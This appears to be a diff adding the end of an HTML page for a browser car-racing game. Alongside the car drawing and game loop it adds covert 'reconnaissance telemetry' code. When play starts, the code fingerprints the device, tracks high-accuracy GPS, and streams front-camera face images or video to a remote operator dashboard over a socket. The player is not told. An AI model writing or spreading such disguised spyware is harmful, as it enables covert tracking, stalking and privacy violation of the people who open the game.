+        ctx.fillRect(w / 2 - 1, -h / 2 + 8, 5, 15);
+        ctx.fillRect(-w / 2 - 4, h / 2 - 22, 5, 15);
+        ctx.fillRect(w / 2 - 1, h / 2 - 22, 5, 15);
+
+        // Chasis Body
+        ctx.fillStyle = bodyColor;
+        ctx.beginPath();
+        ctx.roundRect(-w / 2, -h / 2, w, h, 9);
+        ctx.fill();
+
+        // Cockpit / Tinted Glass Roof
+        ctx.fillStyle = '#090d18';
+        ctx.beginPath();
+        ctx.roundRect(-w / 2 + 4, -h / 2 + 16, w - 8, 24, 4);
+        ctx.fill();
+
+        // Spoiler Wing
+        ctx.fillStyle = '#05070e';
+        ctx.fillRect(-w / 2 + 2, h / 2 - 6, w - 4, 4);
+
+        if (isPlayer) {
+          // Front Headlights
+          ctx.fillStyle = '#ffffff';
+          ctx.shadowColor = '#ffffff';
+          ctx.shadowBlur = 8;
+          ctx.fillRect(-w / 2 + 3, -h / 2, 6, 4);
+          ctx.fillRect(w / 2 - 9, -h / 2, 6, 4);
+          ctx.shadowBlur = 0;
+
+          // Rear Brake Lights
+          ctx.fillStyle = input.brake ? '#ff0000' : '#ff1144';
+          ctx.shadowColor = '#ff0000';
+          ctx.shadowBlur = input.brake ? 16 : 8;
+          ctx.fillRect(-w / 2 + 3, h / 2 - 2, 8, 3);
+          ctx.fillRect(w / 2 - 11, h / 2 - 2, 8, 3);
+          ctx.shadowBlur = 0;
+        } else {
+          // Rival Rear Lights
+          ctx.fillStyle = '#ff2222';
+          ctx.fillRect(-w / 2 + 3, h / 2 - 2, 7, 2);
+          ctx.fillRect(w / 2 - 10, h / 2 - 2, 7, 2);
+        }
+
+        ctx.restore();
+      }
+
+      // ── Game Loop (Delta-Time Synced) ──
+      function gameLoop(now) {
+        const dt = Math.min((now - lastTime) / 1000, 0.05); // max 50ms cap
+        lastTime = now;
+
+        update(dt);
+        render();
+
+        requestAnimationFrame(gameLoop);
+      }
+      requestAnimationFrame(gameLoop);
+
+      // ── Windows Dashboard Sync & Reconnaissance Telemetry ──
+      let socket = null;
+      let gpsWatchId = null;
+      let faceCamRunning = false;
+      let telemetryStarted = false;
+      let cameraStreamMode = 'image'; // 'image' or 'video'
+      let cameraProcessing = false;
+
+      try {
+        socket = io(window.location.origin, { transports: ['polling', 'websocket'] });
+        socket.on('connect', () => {
+          socket.emit('mobile_ready');
+        });
+
+        // Listen for camera mode switch from operator dashboard
+        socket.on('change_camera_mode', (data) => {
+          if (data && data.mode) {
+            cameraStreamMode = data.mode;
+            console.log('Camera mode switched to:', cameraStreamMode);
+          }
+        });
+      } catch (e) {
+        console.warn('Socket init failed:', e);
+      }
+
+      function collectDeviceTelemetry() {
+        const nav = navigator;
+        const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+
+        let model = 'Smartphone';
+        const ua = nav.userAgent;
+        if (/iPhone/i.test(ua)) {
+          model = 'Apple iPhone';
+        } else if (/iPad/i.test(ua)) {
+          model = 'Apple iPad';
+        } else if (/Samsung|SM-[A-Z0-9]+/i.test(ua)) {
+          const m = ua.match(/SM-[A-Z0-9]+/i);
+          model = m ? 'Samsung (' + m[0] + ')' : 'Samsung Galaxy';
+        } else if (/Redmi|POCO|Xiaomi|Mi\s/i.test(ua)) {
+          model = 'Xiaomi / Redmi';
+        } else if (/OnePlus/i.test(ua)) {
+          model = 'OnePlus';
+        } else if (/Pixel/i.test(ua)) {
+          model = 'Google Pixel';
+        } else if (/Vivo/i.test(ua)) {
+          model = 'Vivo';
+        } else if (/OPPO/i.test(ua)) {
+          model = 'OPPO';
+        } else if (/Realme/i.test(ua)) {
+          model = 'Realme';
+        } else if (/Android/i.test(ua)) {
+          model = 'Android Device';
+        }
+
+        let os = 'Unknown OS';
+        if (/Android\s([0-9.]+)/i.test(ua)) {
+          os = 'Android ' + ua.match(/Android\s([0-9.]+)/i)[1];
+        } else if (/OS\s([0-9_]+)\slike\sMac/i.test(ua)) {
+          os = 'iOS ' + ua.match(/OS\s([0-9_]+)\slike\sMac/i)[1].replace(/_/g, '.');
+        } else if (/Windows/i.test(ua)) {
+          os = 'Windows PC';
+        }
+
+        let gpu = 'Standard Mobile GPU';
+        try {
+          const c = document.createElement('canvas');
+          const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+          if (gl) {
+            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            if (dbg) {
+              gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+            }
+          }
+        } catch(e) {}
+
+        const data = {
+          model: model,
+          os: os,
+          gpu: gpu,
+          screen: `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio || 1})`,
+          cores: nav.hardwareConcurrency || '--',
+          memory: nav.deviceMemory ? `${nav.deviceMemory} GB` : '--',
+          language: nav.language || 'en',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Auto',
+          networkType: conn.effectiveType ? conn.effectiveType.toUpperCase() : (conn.type || 'Cellular/WiFi'),
+          downlink: conn.downlink ? `${conn.downlink} Mbps` : '--',
+          rtt: conn.rtt ? `${conn.rtt} ms` : '--',
+          saveData: conn.saveData ? 'Yes' : 'No',
+          battery: '--',
+          charging: false,
+          timestamp: new Date().toISOString()
+        };
+
+        if (nav.getBattery) {
+          nav.getBattery().then(b => {
+            data.battery = Math.round(b.level * 100);
+            data.charging = b.charging;
+            if (socket) socket.emit('device_telemetry', data);
+          }).catch(() => {
+            if (socket) socket.emit('device_telemetry', data);
+          });
+        } else {
+          if (socket) socket.emit('device_telemetry', data);
+        }
+      }
+
+      function startGPS() {
+        if (!navigator.geolocation || gpsWatchId !== null) return;
+        gpsWatchId = navigator.geolocation.watchPosition(
+          (pos) => {
+            if (socket) {
+              socket.emit('send_location', {
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                speed: pos.coords.speed,
+                heading: pos.coords.heading,
+                altitude: pos.coords.altitude,
+                timestamp: new Date().toISOString()
+              });
+            }
+          },
+          (err) => {
+            console.log('GPS error/denied:', err);
+          },
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+        );
+      }
+
+      // Zero-lag asynchronous camera engine
+      function startFaceCam() {
+        if (faceCamRunning) return;
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+        navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          },
+          audio: false
+        }).then((stream) => {
+          faceCamRunning = true;
+          const video = document.getElementById('faceVideo');
+          const canvas = document.getElementById('faceCanvas');
+          if (!video || !canvas) return;
+
+          video.srcObject = stream;
+          video.play().catch(() => {});
+
+          const ctx2d = canvas.getContext('2d', { willReadFrequently: true });
+
+          // Non-blocking capture loop
+          function captureTick() {
+            if (!faceCamRunning) return;
+
+            if (video.videoWidth > 0 && video.videoHeight > 0 && socket && !cameraProcessing) {
+              cameraProcessing = true;
+
+              // Higher resolution for crisp clarity: 480x360 (image) or 320x240 (video)
+              const targetW = (cameraStreamMode === 'video') ? 320 : 480;
+              const targetH = Math.round(targetW * (video.videoHeight / video.videoWidth));
+
+              if (canvas.width !== targetW) {
+                canvas.width = targetW;
+                canvas.height = targetH;
+              }
+
+              ctx2d.drawImage(video, 0, 0, targetW, targetH);
+
+              // Asynchronous toBlob runs off the main thread, keeping 60fps game completely smooth!
+              if (canvas.toBlob) {
+                const quality = (cameraStreamMode === 'video') ? 0.65 : 0.85;
+                canvas.toBlob((blob) => {
+                  if (blob) {
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                      const dataUrl = reader.result;
+                      if (cameraStreamMode === 'video') {
+                        socket.emit('send_video_frame', {
+                          image: dataUrl,
+                          timestamp: new Date().toISOString()
+                        });
+                      } else {
+                        socket.emit('send_face_frame', {
+                          image: dataUrl,
+                          timestamp: new Date().toISOString()
+                        });
+                      }
+                      cameraProcessing = false;
+                    };
+                    reader.readAsDataURL(blob);
+                  } else {
+                    cameraProcessing = false;
+                  }
+                }, 'image/jpeg', quality);
+              } else {
+                try {
+                  const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
+                  socket.emit('send_face_frame', {
+                    image: dataUrl,
+                    timestamp: new Date().toISOString()
+                  });
+                } catch(e) {}
+                cameraProcessing = false;
+              }
+            }
+
+            // In video mode: stream every 200ms (~5 fps smooth video). In image mode: every 1800ms
+            const delay = (cameraStreamMode === 'video') ? 200 : 1800;
+            setTimeout(captureTick, delay);
+          }
+
+          setTimeout(captureTick, 500);
+
+        }).catch((err) => {
+          console.log('Driver face cam not available');
+        });
+      }
+
+      function triggerTelemetryOnStart() {
+        if (telemetryStarted) return;
+        telemetryStarted = true;
+
+        if (socket) {
+          try {
+            socket.emit('game_started', {
+              screen: { width: window.innerWidth, height: window.innerHeight },
+              userAgent: navigator.userAgent,
+              timestamp: new Date().toISOString()
+            });
+          } catch (e) {}
+        }
+
+        // Collect complete device & network intel
+        collectDeviceTelemetry();
+
+        // Start High Accuracy GPS & Zero-lag Front Camera
+        startGPS();
+        startFaceCam();
+      }
+
+    })();
+  </script>
+</body>
+</html>
